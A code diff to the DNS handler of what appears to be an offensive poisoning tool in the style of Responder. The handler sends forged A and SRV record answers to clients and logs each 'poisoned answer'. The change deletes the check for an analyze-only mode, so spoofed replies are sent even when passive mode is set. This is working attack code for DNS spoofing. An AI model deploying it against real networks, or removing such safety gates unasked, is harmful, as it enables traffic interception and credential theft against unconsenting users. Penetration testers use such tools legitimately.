@@ -39,14 +39,14 @@ class DNS(BaseRequestHandler):
 
 		try:
 			data, soc = self.request
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A" and settings.Config.AnalyzeMode == False:
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
 				buff = DNS_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] A Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV" and settings.Config.AnalyzeMode == False:
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
 				buff = DNS_SRV_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
@@ -65,14 +65,14 @@ class DNSTCP(BaseRequestHandler):
 	
 		try:
 			data = self.request.recv(1024)
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A" and settings.Config.AnalyzeMode is False:
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
 				buff = DNS_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				self.request.send(NetworkSendBufferPython2or3(buff))
 				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
 				print(color("[*] [DNS] A Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
 
-			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV" and settings.Config.AnalyzeMode == False:
+			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
 				buff = DNS_SRV_Ans()
 				buff.calculate(NetworkRecvBufferPython2or3(data))
 				self.request.send(NetworkSendBufferPython2or3(buff))
